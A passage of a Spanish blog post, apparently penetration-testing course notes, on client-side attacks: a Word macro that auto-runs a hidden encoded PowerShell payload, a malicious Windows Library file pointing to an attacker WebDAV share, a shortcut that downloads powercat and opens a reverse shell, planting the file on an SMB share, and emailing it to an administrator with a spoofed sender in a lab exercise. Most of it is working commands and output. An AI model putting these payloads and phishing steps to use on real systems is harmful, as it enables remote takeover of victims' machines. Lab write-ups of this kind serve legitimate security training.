+</span><span class="nv">$ENCODED1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">([</span><span class="n">Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetBytes</span><span class="p">(</span><span class="nv">$TEXTO</span><span class="p">))</span><span class="w">
+</span><span class="n">Write-Output</span><span class="w"> </span><span class="nv">$ENCODED1</span><span class="w">
+</span></code></pre></div></div>
+
+<ol>
+  <li>Seguidamente, utilizamos el sigueinte código en python para cortar la cadena en trozos asequibles:</li>
+</ol>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">str</span> <span class="o">=</span> <span class="s">"powershell.exe -nop -w hidden -e &lt;encryptedpayload&gt;"</span>
+
+<span class="n">n</span> <span class="o">=</span> <span class="mi">50</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">),</span> <span class="n">n</span><span class="p">):</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">"Str = Str + "</span> <span class="o">+</span> <span class="s">'"'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">n</span><span class="p">]</span> <span class="o">+</span> <span class="s">'"'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<ol>
+  <li>Y lo incluimos en el siguiente Macro:</li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    
+    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
+        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
+        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
+    ...
+        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
+        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
+        Str = Str + "A== "
+
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+</code></pre></div></div>
+
+<p><strong>Esta sería la plantilla del macro a realizar por el programa Word como Macro en un documento en limpio</strong>.</p>
+
+<p>Seguidamente, el documento lo guardaríamos con la extensión .doc. y el script correría automáticamente cuando un usuario abriese el documento ejecutando en el acto código malicioso.</p>
+
+<p><br /></p>
+
+<h3 id="3-abusing-windows-library-files">3. Abusing Windows Library Files.</h3>
+
+<h4 id="31-presentación-del-concepto">3.1. Presentación del concepto.</h4>
+
+<p>En primer lugar, las <em>Windows library files</em> funcionan como contenedores virtuales; conectan a un usuario con datos almacenados en una localización remota del dominio como servidores web o shares.</p>
+
+<p>Estos ficheros tienen la extensión <em>.Library-ms</em> y pueden ser ejecutados pulsando doble clic en Windows Explore como un ejecutable normal, lo cual los coloca como candidato a un posible cebo como fishing. La idea consiste en crear un Windows library malicioso e incitar a un usuario a clikear sobre él.</p>
+
+<p>En realidad el proceso se divide en dos etapas:</p>
+
+<ul>
+  <li>
+    <p>En la primera intentamos que el usuario ejecute un Windows Library file que transporte al usuario sobre una carpeta bajo nuestro control.</p>
+  </li>
+  <li>
+    <p>En esta carpeta nosotros habremos colocado un ejecutable malicioso que nos brinde una reverse shell.</p>
+  </li>
+</ul>
+
+<p>De una forma más desarrollada, creamos un Windows Library file conectándonos a un WebDAV share. La víctima recibe (via email por ejemplo) un fichero .Library-ms (un Windows Library) este le conecta con nuestro WebDAV share donde habrá un segundo ejecutable (esta vez preferentemente en forma de link, .lnk) que ejecutará una reverse shell que nos brindará un acceso total a la máquina.</p>
+
+<p>Este método también puede ser utilizado con un servidor web convencional como Apache. Sin embargo, estos métodos más utilizados tienen la desventaja de ser bloqueados por anti-spammers u otras medidas de seguridad. Sin embargo, los Windows Library files no suelen ser bloqueados.</p>
+
+<p><br /></p>
+
+<h4 id="32-ejemplo-práctico">3.2. Ejemplo práctico.</h4>
+
+<p><strong>Configurando el WebDAV</strong></p>
+
+<p>En primer lugar, instalamos la utilidad <strong>wsgidav</strong>, que utilizaremos para crear un webdav share en nuestra Kali:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~]
+└─$ sudo pip install -U wsgidav
+Collecting wsgidav
+  Downloading WsgiDAV-4.2.0-py3-none-any.whl (173 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 173.3/173.3 kB 6.4 MB/s eta 0:00:00
+Requirement already satisfied: defusedxml in /usr/lib/python3/dist-packages (from wsgidav) (0.7.1)
+Requirement already satisfied: Jinja2 in /usr/lib/python3/dist-packages (from wsgidav) (3.1.2)
+Collecting json5 (from wsgidav)
+  Downloading json5-0.9.14-py2.py3-none-any.whl (19 kB)
+Requirement already satisfied: PyYAML in /usr/lib/python3/dist-packages (from wsgidav) (6.0)
+Installing collected packages: json5, wsgidav
+Successfully installed json5-0.9.14 wsgidav-4.2.0
+WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv
+
+┌──(kali㉿kali)-[~]
+└─$ pip install git+https://github.com/mar10/wsgidav.git
+Defaulting to user installation because normal site-packages is not writeable
+Collecting git+https://github.com/mar10/wsgidav.git
+  Cloning https://github.com/mar10/wsgidav.git to /tmp/pip-req-build-6onlcjy0
+  Running command git clone --filter=blob:none --quiet https://github.com/mar10/wsgidav.git /tmp/pip-req-build-6onlcjy0
+  Resolved https://github.com/mar10/wsgidav.git to commit dd3e53a5c57b03c19d1d240fbe949b8f75dd6850
+  Installing build dependencies ... done
+  Getting requirements to build wheel ... done
+  Preparing metadata (pyproject.toml) ... done
+Requirement already satisfied: defusedxml in /usr/lib/python3/dist-packages (from WsgiDAV==4.2.1a1) (0.7.1)
+Requirement already satisfied: Jinja2 in /usr/lib/python3/dist-packages (from WsgiDAV==4.2.1a1) (3.1.2)
+Requirement already satisfied: json5 in ./.local/lib/python3.11/site-packages (from WsgiDAV==4.2.1a1) (0.9.14)
+Requirement already satisfied: PyYAML in /usr/lib/python3/dist-packages (from WsgiDAV==4.2.1a1) (6.0)
+Building wheels for collected packages: WsgiDAV
+  Building wheel for WsgiDAV (pyproject.toml) ... done
+  Created wheel for WsgiDAV: filename=WsgiDAV-4.2.1a1-py3-none-any.whl size=172247 sha256=79653b710f2baf96ccfb72f89117e9c653a4e684d84396fa2d2c322a90abbf8c
+  Stored in directory: /tmp/pip-ephem-wheel-cache-h57rbm7q/wheels/4f/a0/8d/0c23cca0690b61495c852ecaf8e6b52defc3d6377a4f10d144
+Successfully built WsgiDAV
+Installing collected packages: WsgiDAV
+  Attempting uninstall: WsgiDAV
+    Found existing installation: WsgiDAV 4.2.0
+    Uninstalling WsgiDAV-4.2.0:
+      Successfully uninstalled WsgiDAV-4.2.0
+  WARNING: The script wsgidav is installed in '/home/kali/.local/bin' which is not on PATH.
+  Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.         
+Successfully installed WsgiDAV-4.2.1a1
+</code></pre></div></div>
+
+<p>creamos en nuestra Kali un WebDAV share:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ mkdir /home/kali/webdav
+
+kali@kali:~$ touch /home/kali/webdav/test.txt
+
+kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
+Running without configuration file.
+17:41:53.917 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
+17:41:53.919 - INFO    : WsgiDAV/4.0.1 Python/3.9.10 Linux-5.15.0-kali3-amd64-x86_64-with-glibc2.33
+17:41:53.919 - INFO    : Lock manager:      LockManager(LockStorageDict)
+17:41:53.919 - INFO    : Property manager:  None
+17:41:53.919 - INFO    : Domain controller: SimpleDomainController()
+17:41:53.919 - INFO    : Registered DAV providers by route:
+17:41:53.919 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/home/kali/.local/lib/python3.9/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
+17:41:53.919 - INFO    :   - '/': FilesystemProvider for path '/home/kali/webdav' (Read-Write) (anonymous)
+17:41:53.920 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
+17:41:53.920 - WARNING : Share '/' will allow anonymous write access.
+17:41:53.920 - WARNING : Share '/:dir_browser' will allow anonymous read access.
+17:41:54.348 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.5.2+ds1 Python 3.9.10
+17:41:54.348 - INFO    : Serving on http://0.0.0.0:80 ..
+</code></pre></div></div>
+
+<p>Primero, creamos un directorio e introducimos en él un fichero. Seguidamente con la herramienta <strong>wsgidav</strong> hacemos accesible este share a todas las interfaces, a través del puerto 80, sin necesidad de autenticación y como directorio ‘root’ o raíz, nuestro directorio de webdav.</p>
+
+<p>Un simple comando con Curl puede enseñarnos que nuestro fichero ‘test.txt’ es accesible:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~]
+└─$ curl http://127.0.0.1/test.txt
+Hello World!
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>Creando el payload.</strong></p>
+
+<p>Ahora que sabemos cómo volver nuestro ejecutable malicioso accesible, veámos cómo construir dicho ejecutable malicioso.</p>
+
+<p>Para ello, utilizaremos por comodidad el editor de texto Visual Studio Code (VSC) y abrimos un fichero que tenga por nombre “config.Library-ms”.</p>
+
+<p>Los Windows Library files están escritos en XML y se dividen en tres partes:</p>
+
+<ul>
+  <li>General Library Information.</li>
+  <li>Library properties.</li>
+  <li>Library locations.</li>
+</ul>
+
+<p>Una visión completa del código iría como sigue:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"&gt;
+&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;
+&lt;version&gt;6&lt;/version&gt;
+&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;
+&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
+&lt;templateInfo&gt;
+&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;
+&lt;/templateInfo&gt;
+&lt;searchConnectorDescriptionList&gt;
+&lt;searchConnectorDescription&gt;
+&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;
+&lt;isSupported&gt;false&lt;/isSupported&gt;
+&lt;simpleLocation&gt;
+&lt;url&gt;http://192.168.119.2&lt;/url&gt;
+&lt;/simpleLocation&gt;
+&lt;/searchConnectorDescription&gt;
+&lt;/searchConnectorDescriptionList&gt;
+&lt;/libraryDescription&gt;
+</code></pre></div></div>
+
+<p>Vamos a desgranar el código.</p>
+
+<p>En primer lugar, las primeras líneas ofrecen la versión de la Windows Library file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"&gt;
+</code></pre></div></div>
+
+<p>Seguidamente ofrecemos el nombre de la librería, el cual no puede ser aleatorio sino que debe tener una extensión de DLL y un índice numérico. Podemos utilizar, según aparece en la documentación de Microsoft, los dos nombres siguientes:  <em>@shell32.dll,-34575</em> o <em>*@windows.storage.dll,-34582</em></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;
+&lt;version&gt;6&lt;/version&gt;
+</code></pre></div></div>
+
+<p>El siguiente elemento determina que el Windows Library es identificable a través de Windows Explorer y el icono es una imagen concreta:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;
+&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
+</code></pre></div></div>
+
+<p>El siguiente conjunto de tags anidados definen el almacenamiento de nuestra Library file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;searchConnectorDescriptionList&gt;
+&lt;searchConnectorDescription&gt;
+&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;
+&lt;isSupported&gt;false&lt;/isSupported&gt;
+&lt;simpleLocation&gt;
+&lt;url&gt;http://192.168.119.2&lt;/url&gt;
+&lt;/simpleLocation&gt;
+&lt;/searchConnectorDescription&gt;
+&lt;/searchConnectorDescriptionList&gt;
+</code></pre></div></div>
+
+<p>la parte más importante evidentemente es la URL, que será una dirección al webDAV de nuestra máquina Kali.</p>
+
+<p>Si guardamos el archivo y cerramos el edito de texto y lo abrimos a través del GUI de Windows podremos observar que se abre una carpeta  de Windows Explorer que contiene nuestra archivo test.txt, se nos ha abierto un contenedor que conecta directamente con nuestra kali completando la primera etapa del ataque.</p>
+
+<p>Si abrimos el fichero de nuevo con un editor comprobamos que se ha añadido una nueva línea al código:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
+ &lt;url&gt;\\192.168.45.154\DavWWWRoot&lt;/url&gt;
+        &lt;serialized&gt;MBAAAEAFCAAAAAAAADAAAAAAAYkgCAQDQAAA...&lt;/serialized&gt;
+      &lt;/simpleLocation&gt;
+[...]
+</code></pre></div></div>
+
+<p>Este nuevo tag puede provocar que el archivo sólo funcione en esta máquina a partir de ahora pero no en otras.</p>
+
+<p>Para evitar problemas al realizar este ataque, podemos restablecer el archivo a su estado original pegando el código en Visual Studio Code. Desafortunadamente, debemos hacer esto cada vez que ejecutamos el archivo de la biblioteca de Windows. Sin embargo, esto no es gran cosa ya que en la mayoría de las auditorías sólo necesitamos que la víctima haga doble clic en el archivo una vez. </p>
+
+<p>Ahora, completaremos el payload creando el shortcut siguiente.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/webdav]
+└─$ ls
+automatic_configuration.lnk  test.txt
+</code></pre></div></div>
+
+<p>Le damos a “Right Click” &gt; New &gt; Shortcut y como item utilizaremos el siguiente introduciendo el siguiente comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://&lt;LOCALIP&gt;:8000/powercat.ps1');
+powercat -c &lt;LOCALIP&gt; -p 4444 -e powershell"
+</code></pre></div></div>
+
+<p>Le damos a Next y como nombre deberíamos poner algo acorde al propósito del relato que queramos utilizar para engatusar al usuario, en este caso; automatic_configuration.</p>
+
+<p>Y transportamos este <em>shortcut</em> sobre nuestra webdav share en nuestra Kali.</p>
+
+<p>Una vez ahí, todo lo que queda es abrir un servidor we de python en el puerto 8000 y colocar en el directorio raiz el ejecutable powercat.ps1</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/Documents/PEN200]
+└─$ cp $(locate powercat.ps1) .; python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre></div></div>
+
+<p>y seguidamente abrir un listener de netcat en el puerto 4444.</p>
+
+<p>Una vez nuestro cliente haya clickeado sobre nuestro ejecutable obtendremos una shell:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~]
+└─$ nc -lvp 4444
+listening on [any] 4444 ...
+192.168.248.194: inverse host lookup failed: Unknown host
+connect to [192.168.45.154] from (UNKNOWN) [192.168.248.194] 58306
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\System32\WindowsPowerShell\v1.0&gt;
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>Pasando el malware a nuestra víctima.</strong></p>
+
+<p>Las formas de pasar el malware a la víctima son múltiples y variadas y depende exclusivamente del contexto de cada auditoría.</p>
+
+<p>En este caso en concreto, aprovecharemos un acceso de escritura a un share smb:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~]
+└─$ crackmapexec smb 192.168.248.195 -u anonymous -p "" --shares
+SMB         192.168.248.195 445    HR137            [*] Windows 10.0 Build 22000 x64 (name:HR137) (domain:HR137) (signing:False) (SMBv1:False)
+SMB         192.168.248.195 445    HR137            [+] HR137\anonymous: 
+SMB         192.168.248.195 445    HR137            [+] Enumerated shares
+SMB         192.168.248.195 445    HR137            Share           Permissions     Remark
+SMB         192.168.248.195 445    HR137            -----           -----------     ------
+SMB         192.168.248.195 445    HR137            ADMIN$                          Remote Admin
+SMB         192.168.248.195 445    HR137            C$                              Default share
+SMB         192.168.248.195 445    HR137            IPC$            READ            Remote IPC
+SMB         192.168.248.195 445    HR137            share           READ,WRITE      
+SMB         192.168.248.195 445    HR137            Users           READ 
+</code></pre></div></div>
+
+<p>Así, empleamos el siguiente comando para logearnos con <em>smbclient</em> y poner el Windows Library file, (recordando tener el webDAV abierto con el link valido, el servidor de python con powercat accesible y un listener de netcat en el puerto adecuado):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //192.168.248.195/share -c 'put config.Library-ms' -U Anonymous 
+Password for [WORKGROUP\Anonymous]:
+putting file config.Library-ms as \config.Library-ms (6.6 kb/s) (average 6.6 kb/s)
+</code></pre></div></div>
+
+<p>Y terminaremos recibiendo una conexión:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~]
+└─$ nc -lvp 4444
+listening on [any] 4444 ...
+192.168.248.195: inverse host lookup failed: Unknown host
+connect to [192.168.45.154] from (UNKNOWN) [192.168.248.195] 50608
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\System32\WindowsPowerShell\v1.0&gt;
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>Capstone Exercise</strong></p>
+
+<p><strong>Enumerate the <em>ADMIN</em> (VM Group 2 - VM #4) machine and find a way to leverage Windows library and shortcut files to get code execution. Obtain a reverse shell and find the flag on the desktop for the <em>Administrator</em> user. You can use VM #3 of VM Group 2 to prepare your attack.</strong></p>
+
+<p>En primer lugar, escaneamos la máquina y comprobamos que tiene un servidor web:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~]
+└─$ ip=192.168.194.199;ports=$(nmap -T5 -p- $ip -Pn | grep '^[0-9]' | cut -d "/" -f1 | tr '\n' "," | sed s/,$//); echo -e "\n[+] Discovered ports --&gt; $ports\n"; nmap -T5 -A -p$ports $ip -Pn -oA $ip
+
+[+] Discovered ports --&gt; 25,80,110,135,139,143,445,587,5985,47001,49664,49665,49666,49667,49668,49669,49670
+
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 03:43 EDT
+Nmap scan report for 192.168.194.199
+Host is up (0.037s latency).
+
+PORT      STATE SERVICE       VERSION
+25/tcp    open  smtp          hMailServer smtpd
+| smtp-commands: ADMIN, SIZE 20480000, AUTH LOGIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+[...]
+</code></pre></div></div>
+
+<p>Escaneamos la web con GoBuster:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~]
+└─$ ip=192.168.194.199;gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x pdf,txt -o file.$ip                                   
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.194.199
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Extensions:              pdf,txt
+[+] Timeout:                 10s
+===============================================================
+2023/09/04 03:49:09 Starting gobuster in directory enumeration mode
+===============================================================
+/info.pdf             (Status: 200) [Size: 676858]
+[...]
+</code></pre></div></div>
+
+<p>Dentro del archivo infor.pdf encontramos información acerca de los mails de usuario que tienen la forma &lt;firstname&gt;.&lt;lastname&gt;\@supermagicorg.com y nos proporciona un usuario de prueba: test\@supermagicorp.com De esta forma, podemos utilizar swak para enviar un email que contenga una Windows Library file sobre el ususario Administrator:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~]
+└─$ sudo swaks -t administrator@supermagicorg.com --from john@beyond.com --attach @config.Library-ms --server 192.168.226.199 --header "Subject: Staging Script" --suppress-data -ap
+Username: test@supermagicorg.com
+Password: test
+=== Trying 192.168.226.199:25...
+=== Connected to 192.168.226.199.
+&lt;-  220 ADMIN ESMTP
+ -&gt; EHLO kali
+&lt;-  250-ADMIN
+&lt;-  250-SIZE 20480000
+&lt;-  250-AUTH LOGIN
+&lt;-  250 HELP
+ -&gt; AUTH LOGIN
+&lt;-  334 VXNlcm5hbWU6
+ -&gt; dGVzdEBzdXBlcm1hZ2ljb3JnLmNvbQ==
+&lt;-  334 UGFzc3dvcmQ6
+ -&gt; dGVzdA==
+&lt;-  235 authenticated.
+ -&gt; MAIL FROM:&lt;john@beyond.com&gt;
+&lt;-  250 OK
+ -&gt; RCPT TO:&lt;administrator@supermagicorp.com&gt;
+&lt;-  250 OK
+ -&gt; DATA
+&lt;-  354 OK, send.
+ -&gt; 36 lines sen
+&lt;-  250 Queued (1.031 seconds)
+ -&gt; QUIT
+&lt;-  221 goodbye
+=== Connection closed with remote host.
+</code></pre></div></div>
+
+
+      </article>
+
+      
+        <div class="blog-tags">
+          <span>Tags:</span>
+          
+            <a href="/tags#pen">pen</a>
+          
+        </div>
+      
+
+      
+
+      
+        <!-- Check if any share-links are active -->
+
+
+
+
+<section id = "social-share-section">
+  <span class="sr-only">Share: </span>
+
+  
+    <a href="https://twitter.com/intent/tweet?text=Client+Side&url=http%3A%2F%2Flocalhost%3A4000%2F2023-11-17-17.Client_Side_Attacks%2F"
+      class="btn btn-social-icon btn-twitter" title="Share on Twitter">
+      <span class="fab fa-fw fa-twitter" aria-hidden="true"></span>
+      <span class="sr-only">Twitter</span>
+    </a>
+  
+
+  
+    <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2F2023-11-17-17.Client_Side_Attacks%2F"
+      class="btn btn-social-icon btn-facebook" title="Share on Facebook">
+      <span class="fab fa-fw fa-facebook" aria-hidden="true"></span>
+      <span class="sr-only">Facebook</span>
+    </a>
+  
+
+  
+    <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2F2023-11-17-17.Client_Side_Attacks%2F"
+      class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
+      <span class="fab fa-fw fa-linkedin" aria-hidden="true"></span>
+      <span class="sr-only">LinkedIn</span>
+    </a>
+  
+
+  
+
+  
+
+</section>
+
+
+
+      
+
+      <ul class="pagination blog-pager">
+        
+        <li class="page-item previous">
+          <a class="page-link" href="/2023-11-16-16.Tunneling_Through_Deep_Packet_Inspection/" data-toggle="tooltip" data-placement="top" title="Deep Packet Tunneling">&larr; Previous Post</a>
+        </li>
+        
+        
+        <li class="page-item next">
+          <a class="page-link" href="/2023-11-19-PEN200_Experience/" data-toggle="tooltip" data-placement="top" title="Mi experiencia con el OSCP">Next Post &rarr;</a>
+        </li>
+        
+      </ul>
+      
+  
+  
+  
+
+  
+
+
+  
+
+
+
+    </div>
+  </div>
+</div>
+
+
+  <footer>
+  <div class="container-md beautiful-jekyll-footer">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+      <ul class="list-inline text-center footer-links"><li class="list-inline-item">
+    <a href="/feed.xml" title="RSS">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">RSS</span>
+    </a>
+  </li><li class="list-inline-item">
+    <a href="mailto:sanmillan.german@gmail.com" title="Email me">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">Email me</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://github.com/Qv1nTv5" title="GitHub">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">GitHub</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://twitter.com/Qvintvs1" title="Twitter">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">Twitter</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://linkedin.com/in/german-sanmillan-68b308229/" title="LinkedIn">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">LinkedIn</span>
+   </a>
+  </li></ul>
+
+      
+      <p class="copyright text-muted">
+      
+        Qv1nTv5
+        &nbsp;&bull;&nbsp;
+      
+      2024
+
+      
+
+      
+      </p>
+      <p class="theme-by text-muted">
+        Powered by
+        <a href="https://beautifuljekyll.com">Beautiful Jekyll</a>
+      </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  
+  
+    
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs=" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+
+  
+
+
+
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script src="/assets/js/beautifuljekyll.js"></script>
+    
+  
+
+
+
+
+
+
+
+
+
+</body>
+</html>
